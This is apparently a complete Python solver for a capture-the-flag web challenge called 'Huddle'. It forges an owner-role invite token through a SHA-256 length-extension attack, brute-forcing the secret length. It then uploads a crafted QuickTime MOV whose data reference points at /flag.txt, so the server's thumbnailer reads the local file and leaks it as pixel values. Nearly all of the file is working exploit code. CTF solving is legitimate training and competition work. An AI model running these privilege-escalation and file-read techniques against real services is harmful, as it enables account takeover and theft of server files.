#!/usr/bin/env python3
"""End-to-end solver for BlackHat MEA Qualification CTF 2026 / Huddle."""

from __future__ import annotations

import argparse
import base64
import hashlib
import io
import json
import re
import secrets
import struct
import sys
from pathlib import Path

import requests
from PIL import Image


ROOT = Path(__file__).resolve().parent
FLAG_PATTERN = re.compile(r"BHFlagY\{[0-9a-f]{32}\}")
FLAG_ALPHABET = bytes(sorted(set(b"BHFlagY{}0123456789abcdef")))
CONTAINERS = {b"moov", b"trak", b"mdia", b"minf", b"dinf", b"stbl", b"edts", b"udta"}

# A one-frame, 41x1, 8-bit paletted QuickTime MOV. Its mdat contains only
# dummy bytes; the exploit replaces the track's data reference with /flag.txt.
BASE_MOV = base64.b64decode(
    "AAAAFGZ0eXBxdCAgAAACAHF0ICAAAAAId2lkZQAAADJtZGF0"
    "////////////////////////////////////////////////////////AAACwW1vb3YAAABsbXZo"
    "ZAAAAAAAAAAAAAAAAAAAA+gAAAPoAAEAAAEAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAA"
    "AAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAItdHJhawAAAFx0"
    "a2hkAAAAAwAAAAAAAAAAAAAAAQAAAAAAAAPoAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAA"
    "AAAAAQAAAAAAAAAAAAAAAAAAQAAAAAApAAAAAQAAAAAAJGVkdHMAAAAcZWxzdAAAAAAAAAABAAAD"
    "6AAAAAAAAQAAAAABpW1kaWEAAAAgbWRoZAAAAAAAAAAAAAAAAAAAQAAAAEAAf/8AAAAAAC1oZGxy"
    "AAAAAG1obHJ2aWRlAAAAAAAAAAAAAAAADFZpZGVvSGFuZGxlcgAAAVBtaW5mAAAAFHZtaGQAAAAB"
    "AAAAAAAAAAAAAAAsaGRscgAAAABkaGxydXJsIAAAAAAAAAAAAAAAAAtEYXRhSGFuZGxlcgAAACRk"
    "aW5mAAAAHGRyZWYAAAAAAAAAAQAAAAx1cmwgAAAAAQAAAORzdGJsAAAAgHN0c2QAAAAAAAAAAQAA"
    "AHByYXcgAAAAAAAAAAEAAAAARkZNUAAAAAAAAAQAACkAAQBIAAAASAAAAAAAAAABFkxhdmM2MS4x"
    "OS4xMDAgcmF3dmlkZW8AAAAAAAAAAAAAKP//AAAACmZpZWwBAAAAABBwYXNwAAAAAQAAAAEAAAAY"
    "c3R0cwAAAAAAAAABAAAAAQAAQAAAAAAcc3RzYwAAAAAAAAABAAAAAQAAAAEAAAABAAAAFHN0c3oA"
    "AAAAAAAAKgAAAAEAAAAUc3RjbwAAAAAAAAABAAAAJAAAACB1ZHRhAAAAGKlzd3IADFXETGF2ZjYx"
    "LjcuMTAw"
)

SHA256_K = (
    0x428A2F98, 0x71374491, 0xB5C0FBCF, 0xE9B5DBA5,
    0x3956C25B, 0x59F111F1, 0x923F82A4, 0xAB1C5ED5,
    0xD807AA98, 0x12835B01, 0x243185BE, 0x550C7DC3,
    0x72BE5D74, 0x80DEB1FE, 0x9BDC06A7, 0xC19BF174,
    0xE49B69C1, 0xEFBE4786, 0x0FC19DC6, 0x240CA1CC,
    0x2DE92C6F, 0x4A7484AA, 0x5CB0A9DC, 0x76F988DA,
    0x983E5152, 0xA831C66D, 0xB00327C8, 0xBF597FC7,
    0xC6E00BF3, 0xD5A79147, 0x06CA6351, 0x14292967,
    0x27B70A85, 0x2E1B2138, 0x4D2C6DFC, 0x53380D13,
    0x650A7354, 0x766A0ABB, 0x81C2C92E, 0x92722C85,
    0xA2BFE8A1, 0xA81A664B, 0xC24B8B70, 0xC76C51A3,
    0xD192E819, 0xD6990624, 0xF40E3585, 0x106AA070,
    0x19A4C116, 0x1E376C08, 0x2748774C, 0x34B0BCB5,
    0x391C0CB3, 0x4ED8AA4A, 0x5B9CCA4F, 0x682E6FF3,
    0x748F82EE, 0x78A5636F, 0x84C87814, 0x8CC70208,
    0x90BEFFFA, 0xA4506CEB, 0xBEF9A3F7, 0xC67178F2,
)


def rotr(value: int, bits: int) -> int:
    return ((value >> bits) | (value << (32 - bits))) & 0xFFFFFFFF


def sha256_compress(state: tuple[int, ...], block: bytes) -> tuple[int, ...]:
    words = list(struct.unpack(">16I", block)) + [0] * 48
    for index in range(16, 64):
        s0 = rotr(words[index - 15], 7) ^ rotr(words[index - 15], 18) ^ (words[index - 15] >> 3)
        s1 = rotr(words[index - 2], 17) ^ rotr(words[index - 2], 19) ^ (words[index - 2] >> 10)
        words[index] = (words[index - 16] + s0 + words[index - 7] + s1) & 0xFFFFFFFF

    a, b, c, d, e, f, g, h = state
    for index in range(64):
        s1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)
        choice = (e & f) ^ ((~e) & g)
        temp1 = (h + s1 + choice + SHA256_K[index] + words[index]) & 0xFFFFFFFF
        s0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)
        majority = (a & b) ^ (a & c) ^ (b & c)
        temp2 = (s0 + majority) & 0xFFFFFFFF
        h, g, f, e, d, c, b, a = (
            g,
            f,
            e,
            (d + temp1) & 0xFFFFFFFF,
            c,
            b,
            a,
            (temp1 + temp2) & 0xFFFFFFFF,
        )

    return tuple(
        (left + right) & 0xFFFFFFFF
        for left, right in zip(state, (a, b, c, d, e, f, g, h))
    )


def sha256_padding(length: int) -> bytes:
    zero_count = (56 - (length + 1) % 64) % 64
    return b"\x80" + b"\x00" * zero_count + struct.pack(">Q", length * 8)


def extend_sha256(digest_hex: str, original_length: int, extension: bytes) -> str:
    state = struct.unpack(">8I", bytes.fromhex(digest_hex))
    processed = original_length + len(sha256_padding(original_length))
    tail = extension + sha256_padding(processed + len(extension))
    for offset in range(0, len(tail), 64):
        state = sha256_compress(state, tail[offset : offset + 64])
    return "".join(f"{word:08x}" for word in state)


def verify_length_extension_implementation() -> None:
    secret = b"known-secret"
    message = b"team=main&email=test@example.test&role=member"
    extension = b"&role=owner"
    digest = hashlib.sha256(secret + message).hexdigest()
    expected = hashlib.sha256(
        secret + message + sha256_padding(len(secret) + len(message)) + extension
    ).hexdigest()
    actual = extend_sha256(digest, len(secret) + len(message), extension)
    if actual != expected:
        raise RuntimeError("SHA-256 length-extension self-test failed")


def request_json(session: requests.Session, method: str, url: str, **kwargs):
    response = session.request(method, url, timeout=30, **kwargs)
    if not response.ok:
        raise RuntimeError(f"{method} {url} failed: {response.status_code} {response.text}")
    try:
        return response.json()
    except ValueError as error:
        raise RuntimeError(f"{method} {url} did not return JSON") from error


def become_owner(base_url: str) -> tuple[requests.Session, int]:
    session = requests.Session()
    session.headers["Connection"] = "close"
    email = f"solver-{secrets.token_hex(8)}@example.test"
    password = secrets.token_hex(16)
    request_json(
        session,
        "POST",
        f"{base_url}/api/register",
        json={"email": email, "password": password},
    )
    invite = request_json(session, "GET", f"{base_url}/api/invite")
    payload = base64.b64decode(invite["token"] + "===")
    extension = b"&role=owner"

    for secret_length in range(1, 65):
        glue = sha256_padding(secret_length + len(payload))
        forged_payload = payload + glue + extension
        forged_signature = extend_sha256(
            invite["sig"], secret_length + len(payload), extension
        )
        response = session.post(
            f"{base_url}/api/join",
            json={
                "token": base64.b64encode(forged_payload).decode().rstrip("="),
                "sig": forged_signature,
            },
            timeout=30,
        )
        if response.ok and response.json().get("role") == "owner":
            me = request_json(session, "GET", f"{base_url}/api/me")
            if me.get("role") != "owner":
                raise RuntimeError("join response said owner but /api/me disagreed")
            return session, secret_length
    raise RuntimeError("no SHA-256 prefix-MAC secret length in 1..64 was accepted")


def make_box(kind: bytes, payload: bytes) -> bytes:
    return struct.pack(">I4s", len(payload) + 8, kind) + payload


def make_alias_entry(target: bytes) -> bytes:
    even_target = target + (b"\x00" if len(target) & 1 else b"")
    alias = (
        b"\x00" * 10
        + b"\x01X"
        + b"\x00" * 26
        + b"\x00" * 12
        + b"\x04flag"
        + b"\x00" * 59
        + b"\x00" * 16
        + struct.pack(">HH", 0, 0)
        + b"\x00" * 16
        + struct.pack(">hH", 2, len(target))
        + even_target
        + struct.pack(">hH", -1, 0)
    )
    return make_box(b"alis", b"\x00\x00\x00\x00" + alias)


def make_external_dref(target: bytes) -> bytes:
    payload = b"\x00\x00\x00\x00" + struct.pack(">I", 1) + make_alias_entry(target)
    return make_box(b"dref", payload)


def palette_codebook() -> dict[int, int]:
    return {symbol: 8 + index * 10 for index, symbol in enumerate(FLAG_ALPHABET)}


def patch_stsd_palette(payload: bytes) -> bytes:
    entry_offset = 8
    entry_size, entry_type = struct.unpack_from(">I4s", payload, entry_offset)
    if entry_type != b"raw " or entry_size < 86:
        raise RuntimeError("unexpected MOV raw-video sample description")
    entry = bytearray(payload[entry_offset : entry_offset + entry_size])
    struct.pack_into(">H", entry, 82, 8)
    struct.pack_into(">H", entry, 84, 0)
    values = palette_codebook()
    table = bytearray(struct.pack(">IHH", 0, 0, 255))
    for index in range(256):
        value = values.get(index, 0)
        table += struct.pack(">HHHH", index, value << 8, value << 8, value << 8)
    entry = entry[:86] + table + entry[86:]
    entry[0:4] = struct.pack(">I", len(entry))
    return payload[:entry_offset] + bytes(entry) + payload[entry_offset + entry_size :]


def rewrite_mov_boxes(data: bytes, target: bytes) -> bytes:
    result = bytearray()
    offset = 0
    while offset < len(data):
        if len(data) - offset < 8:
            raise RuntimeError("trailing data in MOV box tree")
        size, kind = struct.unpack_from(">I4s", data, offset)
        if size < 8 or offset + size > len(data):
            raise RuntimeError(f"invalid MOV box {kind!r}")
        payload = data[offset + 8 : offset + size]
        if kind == b"dref":
            result += make_external_dref(target)
        else:
            if kind in CONTAINERS:
                payload = rewrite_mov_boxes(payload, target)
            elif kind == b"stco":
                count = struct.unpack_from(">I", payload, 4)[0]
                payload = payload[:8] + struct.pack(">I", 0) * count
            elif kind == b"stsz":
                if struct.unpack_from(">I", payload, 8)[0] != 1:
                    raise RuntimeError("unexpected MOV sample count")
                payload = payload[:4] + struct.pack(">I", 41) + payload[8:12]
            elif kind == b"stsd":
                payload = patch_stsd_palette(payload)
            result += make_box(kind, payload)
        offset += size
    return bytes(result)


def decode_flag(jpeg: bytes) -> tuple[str, int]:
    image = Image.open(io.BytesIO(jpeg)).convert("L")
    if image.size != (41, 1):
        raise RuntimeError(f"unexpected thumbnail dimensions: {image.size}")
    codebook = palette_codebook()
    inverse = {value: symbol for symbol, value in codebook.items()}
    decoded = bytearray()
    max_error = 0
    for pixel in image.get_flattened_data():
        closest = min(inverse, key=lambda value: abs(value - pixel))
        max_error = max(max_error, abs(closest - pixel))
        decoded.append(inverse[closest])
    if max_error > 4:
        raise RuntimeError(f"JPEG palette decoding confidence too low: error={max_error}")
    flag = decoded.decode("ascii")
    if FLAG_PATTERN.fullmatch(flag) is None:
        raise RuntimeError(f"decoded data does not match the flag format: {flag!r}")
    return flag, max_error


def solve(base_url: str) -> str:
    verify_length_extension_implementation()
    session, secret_length = become_owner(base_url)
    settings = request_json(
        session,
        "POST",
        f"{base_url}/api/workspace/settings",
        json={"video_messages": True},
    )
    if not settings.get("settings", {}).get("video_messages"):
        raise RuntimeError("video_messages did not become enabled")

    malicious_mov = rewrite_mov_boxes(BASE_MOV, b"/flag.txt")
    upload = request_json(
        session,
        "POST",
        f"{base_url}/api/files/upload",
        data=malicious_mov,
        headers={"Content-Type": "application/octet-stream"},
    )
    thumbnail = request_json(
        session,
        "POST",
        f"{base_url}/api/files/thumbnail",
        json={"file_id": upload["file_id"]},
    )
    image_response = session.get(f"{base_url}{thumbnail['thumb_url']}", timeout=30)
    if not image_response.ok:
        raise RuntimeError(
            f"thumbnail download failed: {image_response.status_code} {image_response.text}"
        )
    flag, max_error = decode_flag(image_response.content)
    return flag


def main() -> int:
    instance = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in instance["endpoints"] if item["name"] == "main")
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default=endpoint["url"])
    args = parser.parse_args()
    try:
        flag = solve(args.url.rstrip("/"))
    except (requests.RequestException, RuntimeError, KeyError, ValueError) as error:
        print(f"[-] {error}", file=sys.stderr)
        return 1
    sys.stdout.buffer.write(flag.encode("ascii"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
